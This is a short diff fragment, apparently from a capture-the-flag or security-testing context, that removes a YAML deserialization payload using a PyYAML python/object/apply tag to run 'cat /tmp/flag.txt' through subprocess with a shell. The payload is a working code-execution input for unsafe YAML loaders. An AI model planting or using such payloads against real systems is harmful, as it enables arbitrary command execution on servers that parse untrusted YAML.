@@ -1,3 +1,0 @@
-!!python/object/apply:subprocess.check_output
-       args: [ cat /tmp/flag.txt ]
-       kwds: { shell: true }
